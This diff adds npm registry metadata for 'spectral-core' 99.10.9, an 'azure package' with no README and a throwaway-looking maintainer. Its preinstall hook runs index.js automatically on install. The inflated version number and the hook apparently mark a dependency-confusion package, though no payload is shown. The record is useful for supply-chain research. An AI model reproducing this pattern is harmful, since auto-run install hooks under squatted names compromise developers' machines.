@@ -1,0 +1,62 @@
+{
+    "_id": "spectral-core",
+    "name": "spectral-core",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "spectral-core",
+            "version": "99.10.9",
+            "description": "azure package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "spectral-core@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-v3idE2gEKtj06LUoA98Ho8fewGwi5x320OpxTP6BC5IL8GPaM+iTYf4+E7gybx97NQMJNIWD3Af5RsKd/P+eug==",
+                "shasum": "d9d7c2e31afe7eaec50ee6f8147379c2bdc98c42",
+                "tarball": "https://registry.npmjs.org/spectral-core/-/spectral-core-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5065,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiO8APACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmpPLA//YvCaernCCQ6ObZOQCYuVojwKXqaAXyJFI04MQgPK45L6fIgW\r\nLcechUCcgq6XddqC0EpthsOJmL35c981XIeiL86xd4ze3o/lttU4HwgHWB/Y\r\nAaeo0NYHS2hmH/Ng5idLuHvK97MWaapavhrf2V0K8B8Eze3IbRlPnNwwZHg/\r\nngSzM3Mj0+3zGHcXAmVSBuoztROj+fa31wEQr2LQdij5MT8UPHkYZDbUG7I5\r\nkS3mwX952RytP2cb1/nhiDg8kPPdvRKAYtGNFPj68LFp43/eWWqeksfqTb+D\r\n0xigw74UpTnizIf2OiW11QbpR6eMEnGP+FsDqv/3rAHKSpY5PcsAWH6hzGb1\r\nVCZjNKAxIe5AKf7UMKLWWfT/UKspTsK0GAZneTGc7FaRUV6DnvwL/0rQaZVq\r\n3qJ4dErgWSONWcUIjUM+UrCNjq/1Dliuuatf/MXgXm/1t/RGnuKRNp8eVrTw\r\nII1OEEjG2s13rUUwQyXHiROkFfk5eXfHjjXRV42qQZjx7EMRdtJlxdY/pb0S\r\n7BAiCFpawnK11uoi/3B0k5Yw8nmARMQfOyBy8aon61eKweEorMLOm3EGThw+\r\nzcG+OJ6aGVKeltTEbxbA0vzanHLEPNc5muSyQzw7U2deQjOMrF3AaqmTKx6E\r\ne9TFoY85YKnu72v153okIdasB/FqRdNcKK0=\r\n=gmmT\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "symuk35m",
+                "email": "symuk35m@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "symuk35m",
+                    "email": "symuk35m@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/spectral-core_99.10.9_1648082958968_0.9093123003229229"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-24T00:49:18.967Z",
+        "99.10.9": "2022-03-24T00:49:19.126Z",
+        "modified": "2022-03-24T00:49:19.233Z"
+    },
+    "maintainers": [
+        {
+            "name": "symuk35m",
+            "email": "symuk35m@rt11.ml"
+        }
+    ],
+    "description": "azure package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
